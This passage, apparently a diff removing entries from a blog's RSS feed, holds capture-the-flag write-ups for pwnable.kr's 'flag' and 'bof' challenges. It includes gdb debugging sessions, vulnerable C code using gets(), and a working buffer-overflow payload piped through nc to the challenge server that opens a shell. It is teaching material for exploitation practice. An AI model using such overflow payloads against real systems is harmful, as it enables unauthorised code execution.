-   0x000000000040119a &amp;lt;+54&amp;gt;:	mov    eax,0x0
-   0x000000000040119f &amp;lt;+59&amp;gt;:	leave  
-   0x00000000004011a0 &amp;lt;+60&amp;gt;:	ret    
-End of assembler dump.&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
-
-&lt;p&gt;Here we have an assembly code of &lt;code class=&quot;highlighter-rouge&quot;&gt;main&lt;/code&gt; function. One particular thing that brought my notice is at &lt;code class=&quot;highlighter-rouge&quot;&gt;main+32&lt;/code&gt;, where something is passed into &lt;code class=&quot;highlighter-rouge&quot;&gt;rdx&lt;/code&gt;. Let’s set a breakpoint line after, at &lt;code class=&quot;highlighter-rouge&quot;&gt;mov+39&lt;/code&gt; and check what &lt;code class=&quot;highlighter-rouge&quot;&gt;rdx&lt;/code&gt; is storing.&lt;/p&gt;
-
-&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;gdb&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;break&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;0x000000000040118b
-Breakpoint 1 at 0x40118b
-&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;gdb&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; run
-Starting program: /home/w3ndige/programming/pwnable.kr/flag_
-I will malloc&lt;span class=&quot;o&quot;&gt;()&lt;/span&gt; and strcpy the flag there. take it.
-
-Breakpoint 1, 0x000000000040118b &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;main &lt;span class=&quot;o&quot;&gt;()&lt;/span&gt;
-&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;gdb&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; x/s &lt;span class=&quot;nv&quot;&gt;$rdx&lt;/span&gt;
-0x496628:	&lt;span class=&quot;s2&quot;&gt;&quot;UPX...? sounds like a delivery service :)&quot;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
-
-&lt;p&gt;Great, a flag! But after a little bit of playing with it, I’ve found another place where it’s possible to find a flag. Take a look at &lt;code class=&quot;highlighter-rouge&quot;&gt;main+49&lt;/code&gt; and see what’s in &lt;code class=&quot;highlighter-rouge&quot;&gt;eax&lt;/code&gt;.&lt;/p&gt;
-
-&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;gdb&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;break&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;0x000000000040119a
-Breakpoint 1 at 0x40119a
-&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;gdb&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; run
-Starting program: /home/w3ndige/programming/pwnable.kr/flag_
-I will malloc&lt;span class=&quot;o&quot;&gt;()&lt;/span&gt; and strcpy the flag there. take it.
-
-Breakpoint 1, 0x000000000040119a &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;main &lt;span class=&quot;o&quot;&gt;()&lt;/span&gt;
-&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;gdb&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; x/s &lt;span class=&quot;nv&quot;&gt;$eax&lt;/span&gt;
-0x6c96b0:	&lt;span class=&quot;s2&quot;&gt;&quot;UPX...? sounds like a delivery service :)&quot;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
-
-&lt;p&gt;And here we have the flag, once again.&lt;/p&gt;
-</description>
-        <pubDate>Sun, 26 Nov 2017 08:00:00 +0000</pubDate>
-        <link>http://localhost:4000/pwnable.kr-flag/</link>
-        <guid isPermaLink="true">http://localhost:4000/pwnable.kr-flag/</guid>
-      </item>
-    
-      <item>
-        <title>Pwnable.kr - bof</title>
-        <description>&lt;p&gt;Another challenge from &lt;a href=&quot;http://pwnable.kr&quot; title=&quot;pwnable.kr&quot;&gt;pwnable.kr&lt;/a&gt; will show us how to perform a simple buffer overflow attack.&lt;/p&gt;
-
-&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;Nana told me that buffer overflow is one of the most common software vulnerability.
-Is that true?&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
-
-&lt;p&gt;This time we’re going to download the source code and the binary from the webpage. After that we’re ready to analyze whatever this challenge brings to us.&lt;/p&gt;
-
-&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-c&quot; data-lang=&quot;c&quot;&gt;&lt;span class=&quot;cp&quot;&gt;#include &amp;lt;stdio.h&amp;gt;
-#include &amp;lt;string.h&amp;gt;
-#include &amp;lt;stdlib.h&amp;gt;
-&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;func&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;key&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;){&lt;/span&gt;
-	&lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;overflowme&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;32&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
-	&lt;span class=&quot;n&quot;&gt;printf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;overflow me : &quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
-	&lt;span class=&quot;n&quot;&gt;gets&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;overflowme&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;	&lt;span class=&quot;c1&quot;&gt;// smash me!&lt;/span&gt;
-	&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;key&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0xcafebabe&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;){&lt;/span&gt;
-		&lt;span class=&quot;n&quot;&gt;system&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;/bin/sh&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
-	&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
-	&lt;span class=&quot;k&quot;&gt;else&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
-		&lt;span class=&quot;n&quot;&gt;printf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Nah..&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
-	&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
-&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
-&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;main&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;argc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;argv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[]){&lt;/span&gt;
-	&lt;span class=&quot;n&quot;&gt;func&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0xdeadbeef&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
-	&lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
-&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
-
-&lt;p&gt;Firstly, we can see that this application is vulnerable to overflow, since &lt;code class=&quot;highlighter-rouge&quot;&gt;gets()&lt;/code&gt; function won’t cut the characters after the buffer. Let’s see man pages.&lt;/p&gt;
-
-&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;Never use gets().  Because it is impossible to tell without knowing the
-data  in  advance  how  many  characters  gets() will read, and because
-gets() will continue to store characters past the end of the buffer, it
-is  extremely  dangerous  to  use.   It has been used to break computer
-security.  Use fgets() instead.&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
-
-&lt;p&gt;Since the best way to execute &lt;code class=&quot;highlighter-rouge&quot;&gt;/bin/sh&lt;/code&gt; is to make the the comparision &lt;strong&gt;&lt;em&gt;true&lt;/em&gt;&lt;/strong&gt;, we will have to overflow the buffer, and change the value of the &lt;code class=&quot;highlighter-rouge&quot;&gt;key&lt;/code&gt; parameter. Game plan is to find out the address of the &lt;code class=&quot;highlighter-rouge&quot;&gt;key&lt;/code&gt;, and then the address of
-&lt;code class=&quot;highlighter-rouge&quot;&gt;overflowme&lt;/code&gt;. This will allow us to calculate the offset between those 2 addresses, resulting in the number of trash data that has to be put into the buffer.&lt;/p&gt;
-
-&lt;p&gt;Let’s fire up &lt;strong&gt;&lt;em&gt;gdb&lt;/em&gt;&lt;/strong&gt;, and disassemble &lt;code class=&quot;highlighter-rouge&quot;&gt;main()&lt;/code&gt; function.&lt;/p&gt;
-
-&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;w3ndige@main ~ % gdb ./bof
-
-&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;gdb&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; disas main
-Dump of assembler code &lt;span class=&quot;k&quot;&gt;for function &lt;/span&gt;main:
-   0x0000068a &amp;lt;+0&amp;gt;:	push   %ebp
-   0x0000068b &amp;lt;+1&amp;gt;:	mov    %esp,%ebp
-   0x0000068d &amp;lt;+3&amp;gt;:	and    &lt;span class=&quot;nv&quot;&gt;$0xfffffff0&lt;/span&gt;,%esp
-   0x00000690 &amp;lt;+6&amp;gt;:	sub    &lt;span class=&quot;nv&quot;&gt;$0x10&lt;/span&gt;,%esp
-   0x00000693 &amp;lt;+9&amp;gt;:	movl   &lt;span class=&quot;nv&quot;&gt;$0xdeadbeef&lt;/span&gt;,&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;%esp&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
-   0x0000069a &amp;lt;+16&amp;gt;:	call   0x62c &amp;lt;func&amp;gt;
-   0x0000069f &amp;lt;+21&amp;gt;:	mov    &lt;span class=&quot;nv&quot;&gt;$0x0&lt;/span&gt;,%eax
-   0x000006a4 &amp;lt;+26&amp;gt;:	leave
-   0x000006a5 &amp;lt;+27&amp;gt;:	ret
-End of assembler dump.&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
-
-&lt;p&gt;Here we can see that at &lt;code class=&quot;highlighter-rouge&quot;&gt;main+9&lt;/code&gt; the &lt;strong&gt;&lt;em&gt;0xdeadbeef&lt;/em&gt;&lt;/strong&gt; is moved into the &lt;strong&gt;&lt;em&gt;esp&lt;/em&gt;&lt;/strong&gt;. In order to find the address of this variable we will have to set up breakpoint at &lt;code class=&quot;highlighter-rouge&quot;&gt;main+16&lt;/code&gt;, and view the content of &lt;strong&gt;&lt;em&gt;stack pointer&lt;/em&gt;&lt;/strong&gt;.&lt;/p&gt;
-
-&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;gdb&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;break&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;main+16
-Breakpoint 1 at 0x69a
-&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;gdb&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; run
-Starting program: /home/w3ndige/programming/pwnable.kr/bof
-
-Breakpoint 1, 0x5655569a &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;main &lt;span class=&quot;o&quot;&gt;()&lt;/span&gt;
-&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;gdb&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; x/x &lt;span class=&quot;nv&quot;&gt;$esp&lt;/span&gt;
-0xffffd180:	0xdeadbeef&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
-
-&lt;p&gt;Great, we have it! Now we have to find the address of &lt;code class=&quot;highlighter-rouge&quot;&gt;overflowme&lt;/code&gt; buffer, which lays in the &lt;code class=&quot;highlighter-rouge&quot;&gt;func&lt;/code&gt; function. Let’s disassemble it.&lt;/p&gt;
-
-&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;gdb&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; disas func
-Dump of assembler code &lt;span class=&quot;k&quot;&gt;for function &lt;/span&gt;func:
-   0x0000062c &amp;lt;+0&amp;gt;:	push   ebp
-   0x0000062d &amp;lt;+1&amp;gt;:	mov    ebp,esp
-   0x0000062f &amp;lt;+3&amp;gt;:	sub    esp,0x48
-   0x00000632 &amp;lt;+6&amp;gt;:	mov    eax,gs:0x14
-   0x00000638 &amp;lt;+12&amp;gt;:	mov    DWORD PTR &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;ebp-0xc],eax
-   0x0000063b &amp;lt;+15&amp;gt;:	xor    eax,eax
-   0x0000063d &amp;lt;+17&amp;gt;:	mov    DWORD PTR &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;esp],0x78c
-   0x00000644 &amp;lt;+24&amp;gt;:	call   0x645 &amp;lt;func+25&amp;gt;
-   0x00000649 &amp;lt;+29&amp;gt;:	lea    eax,[ebp-0x2c]
-   0x0000064c &amp;lt;+32&amp;gt;:	mov    DWORD PTR &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;esp],eax
-   0x0000064f &amp;lt;+35&amp;gt;:	call   0x650 &amp;lt;func+36&amp;gt;
-   0x00000654 &amp;lt;+40&amp;gt;:	cmp    DWORD PTR &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;ebp+0x8],0xcafebabe
-   0x0000065b &amp;lt;+47&amp;gt;:	jne    0x66b &amp;lt;func+63&amp;gt;
-   0x0000065d &amp;lt;+49&amp;gt;:	mov    DWORD PTR &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;esp],0x79b
-   0x00000664 &amp;lt;+56&amp;gt;:	call   0x665 &amp;lt;func+57&amp;gt;
-   0x00000669 &amp;lt;+61&amp;gt;:	jmp    0x677 &amp;lt;func+75&amp;gt;
-   0x0000066b &amp;lt;+63&amp;gt;:	mov    DWORD PTR &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;esp],0x7a3
-   0x00000672 &amp;lt;+70&amp;gt;:	call   0x673 &amp;lt;func+71&amp;gt;
-   0x00000677 &amp;lt;+75&amp;gt;:	mov    eax,DWORD PTR &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;ebp-0xc]
-   0x0000067a &amp;lt;+78&amp;gt;:	xor    eax,DWORD PTR gs:0x14
-   0x00000681 &amp;lt;+85&amp;gt;:	je     0x688 &amp;lt;func+92&amp;gt;
-   0x00000683 &amp;lt;+87&amp;gt;:	call   0x684 &amp;lt;func+88&amp;gt;
-   0x00000688 &amp;lt;+92&amp;gt;:	leave
-   0x00000689 &amp;lt;+93&amp;gt;:	ret
-End of assembler dump.&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
-
-&lt;p&gt;Since we know that local variables are on the negative size of &lt;strong&gt;&lt;em&gt;ebp&lt;/em&gt;&lt;/strong&gt; (&lt;a href=&quot;https://www.cs.virginia.edu/~evans/cs216/guides/x86.html&quot; title=&quot;read more&quot;&gt;read more&lt;/a&gt;), we can guess that &lt;code class=&quot;highlighter-rouge&quot;&gt;ebp-0x2c&lt;/code&gt; is the address of &lt;code class=&quot;highlighter-rouge&quot;&gt;overflowme&lt;/code&gt; variable. Let’s set another breakpoint at &lt;code class=&quot;highlighter-rouge&quot;&gt;gets&lt;/code&gt; and find out if it’s true.&lt;/p&gt;
-
-&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;gdb&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;break &lt;/span&gt;gets
-Breakpoint 2 at 0xf7e3b915
-&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;gdb&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; c
-Continuing.
-overflow me :
-
-Breakpoint 2, 0xf7e3b915 &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;gets &lt;span class=&quot;o&quot;&gt;()&lt;/span&gt; from /usr/lib32/libc.so.6
-&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;gdb&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; next
-Single stepping &lt;span class=&quot;k&quot;&gt;until &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;exit &lt;/span&gt;from &lt;span class=&quot;k&quot;&gt;function &lt;/span&gt;gets,
-which has no line number information.
-helloworld
-0x56555654 &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;func &lt;span class=&quot;o&quot;&gt;()&lt;/span&gt;
-&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;gdb&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; x/1s &lt;span class=&quot;nv&quot;&gt;$ebp&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-0x2c&lt;/span&gt;
-0xffffd14c:	&lt;span class=&quot;s2&quot;&gt;&quot;helloworld&quot;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
-
-&lt;p&gt;Now we’re ready to calculate the offset between those two addresses.&lt;/p&gt;
-
-&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-python&quot; data-lang=&quot;python&quot;&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0xffffd180&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0xffffd14c&lt;/span&gt;
-&lt;span class=&quot;mi&quot;&gt;52&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
-
-&lt;p&gt;Ready to exploit?&lt;/p&gt;
-
-&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;w3ndige@main ~ % &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;python2 &lt;span class=&quot;nt&quot;&gt;-c&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;print 52*'A'+'&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;be&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;ba&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;fe&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;ca'&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cat&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; | nc pwnable.kr 9000
-&lt;span class=&quot;nb&quot;&gt;whoami
-&lt;/span&gt;bof
-&lt;span class=&quot;nb&quot;&gt;ls&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-la&lt;/span&gt;
-total 25060
-drwxr-x---  3 root bof      4096 Oct 23  2016 &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
-drwxr-xr-x 80 root root     4096 Jan 11  2017 ..
-d---------  2 root root     4096 Jun 12  2014 .bash_history
-&lt;span class=&quot;nt&quot;&gt;-r-xr-x---&lt;/span&gt;  1 root bof      7348 Sep 12  2016 bof
-&lt;span class=&quot;nt&quot;&gt;-rw-r--r--&lt;/span&gt;  1 root root      308 Oct 23  2016 bof.c
-&lt;span class=&quot;nt&quot;&gt;-r--r-----&lt;/span&gt;  1 root bof        32 Jun 11  2014 flag
-&lt;span class=&quot;nt&quot;&gt;-rw-------&lt;/span&gt;  1 root root 25626087 Nov 23 11:33 log
-&lt;span class=&quot;nt&quot;&gt;-rw-r--r--&lt;/span&gt;  1 root root        0 Oct 23  2016 log2
-&lt;span class=&quot;nt&quot;&gt;-rwx------&lt;/span&gt;  1 root root      760 Sep 10  2014 super.pl
-&lt;span class=&quot;nb&quot;&gt;cat &lt;/span&gt;flag
-daddy, I just pwned a buFFer :&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
-
-&lt;p&gt;By printing 52 &lt;strong&gt;&lt;em&gt;A&lt;/em&gt;&lt;/strong&gt; letters and the number used in comparision (stored in &lt;strong&gt;&lt;em&gt;little endian format&lt;/em&gt;&lt;/strong&gt;), we were able to exploit this application.&lt;/p&gt;
-</description>
-        <pubDate>Sat, 25 Nov 2017 08:00:00 +0000</pubDate>
-        <link>http://localhost:4000/pwnable.kr-bof/</link>
-        <guid isPermaLink="true">http://localhost:4000/pwnable.kr-bof/</guid>
       </item>
     
   </channel>
